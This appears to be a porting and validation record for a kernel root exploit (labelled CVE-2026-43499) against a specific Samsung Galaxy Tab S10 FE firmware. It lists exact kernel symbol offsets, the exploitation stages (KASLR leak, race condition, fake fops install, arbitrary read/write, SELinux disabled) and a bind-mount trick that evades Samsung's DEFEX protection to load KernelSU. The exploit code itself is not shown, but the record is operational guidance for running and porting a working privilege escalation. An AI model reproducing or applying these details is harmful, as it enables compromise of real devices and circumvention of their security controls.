# SM-X520 X520XXSACZH6 — hardware-validated porting record

Galaxy Tab S10 FE (Wi-Fi, SM-X520, Exynos 1580 / platform essi).
Follow-up to the offline `SM-X520-X520XXSBCZI2` port: the target device
runs `X520XXSACZH6` (device CSC `XAC`, Canada), so the profile was re-derived
against that exact build and executed on hardware.

## Firmware identity

```text
model: SM-X520 (device gts10fewifi, platform essi / Exynos 1580)
CSC: XAC (Canada), sales code X520OXMACZH6
AP/PDA: X520XXSACZH6
display build: BP4A.251205.006.X520XXSACZH6 (Android 16)
kernel release: 6.6.102-android15-8-abX520XXSACZH6-4k
boot.img SHA-256: 4833ECDDD05F77E27FEDC6BB88BF512B44A72C465B5A75208345596C0565A5FC
kernel SHA-256: 35DEACB3206F30A8386A224795F429395A9B26AD8AAF5C9542EF63A730C3A048
kernel size: 38713856
```

Same android15-6.6 KMI family; all BTF layout values identical to the ZI2
record. ZH6-specific symbol offsets (all re-derived from this Image):

| Macro | Offset |
| --- | ---: |
| `ASHMEM_IOCTL_OFF` | `0x00d65754` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00d65e10` |
| `ASHMEM_MMAP_OFF` | `0x00d65e64` |
| `ASHMEM_OPEN_OFF` | `0x00d66084` |
| `ASHMEM_RELEASE_OFF` | `0x00d6610c` |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00d66198` |
| `ASHMEM_MISC_OFF` | `0x0245c8d8` |
| `KMALLOC_CACHES_OFF` | `0x017d85d0` |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x022dae60` |
| `INIT_TASK_OFF` | `0x022ee340` |
| `ROOT_TASK_GROUP_OFF` | `0x024fbd80` |
| `SELINUX_ENFORCING_OFF` | `0x0253e598` |
| `SYSCTL_BOOTID_OFF` | `0x026211d0` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x0175ce1d` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `0x022e2278` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `0x024193b8` |

`SLIDE_TRACEFS_EVENT_ID 109`, `SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d98dc`,
`SLIDE_PSELECT_WORD_SHIFT 0` — identical to the family; the worker-caller
value was confirmed on hardware by the tracefs leak resolving at
`base + 0xd98dc` on both executed boots.

KernelSU module: same v3.2.5 + samsung-kdp-rkp-defex patch, DDK
`android15-6.6-20260313`, no-patch-text, vermagic
`6.6.102-android15-8-abX520XXSACZH6-4k SMP preempt mod_unload modversions
aarch64`; `check_symbol` passed against the recovered ZH6 `vmlinux.elf`;
all 214 undefined imports resolved in the target kallsyms.

## Hardware validation record (2026-10-25)

Executed from `adb shell` (uid 2000, `u:r:shell:s0`, enforcing) with the
shell payload (`stack_writer=pselect reclaim=legacy fops=bank`):

- boot 1, 1 attempt: KASLR tracefs leak OK (slide `0x110000`), kernelsnitch
  mm leak OK, GhostLock pselect race OK; fake-fops install missed
  (`cfi misc_fops mismatch read=0`) — no crash, clean failure.
- reboot; boot 2, attempts=8: **completed on attempt 1** — fake fops
  installed, configfs ARW verified (`read_ok=1 write_ok=1 rw64=1/1`),
  misc fops restored to the real `ashmem_fops`, and
  `uid=2000 -> 0` with the umh daemon up.
- `cve-2026-43499-root -c 'id'`: `uid=0(root) context=u:r:kernel:s0`,
  SELinux permissive during exploitation.

KernelSU integration findings (two fixes were required):

1. The helper's `--late-load` execs the staged ksud through a bind mount
   over `/system/bin/logcat`; this is mandatory, not cosmetic: a direct
   `/system/bin/sh` exec of `/data/local/tmp/.ksud-stage` is killed by
   DEFEX (`[DEFEX] Safeplace violation [task=sh ... child=/data/local/tmp/.ksud-stage]`).
2. Upstream KernelSU v3.2.5 `ksud` lacks the `late-load --ephemeral` flag
   the guarded route passes. An `--ephemeral` flag was added to the
   `LateLoad` clap variant (accepted; full install path retained) and ksud
   rebuilt. Note `KSU_LOADER_PATH` is `/data/local/tmp/ksud-s25u-kdp`, so
   that exact path must hold the current build.

After `--late-load` (exit 0): `/proc/modules` reports
`kernelsu 172032 0 - Live (O)`, SELinux is back to **Enforcing**, and
KernelSU Manager v3.2.5 (versionCode 32525) installs and manages the
module. Root is per-boot: re-run the exploit + late-load after each reboot
(`/data/local/tmp/root-x520.sh` on the validated device performs the
complete sequence).

## Artifacts

```text
artifacts/essi-X520XXSACZH6/cve-2026-43499-app.so        104128 bytes
artifacts/essi-X520XXSACZH6/cve-2026-43499-root           27072 bytes
kernelsu/android15-6.6_kernelsu-essi-X520XXSACZH6-kdp.ko 325784 bytes
kernelsu/ksud-essi-X520XXSACZH6-kdp                      4756504 bytes
```
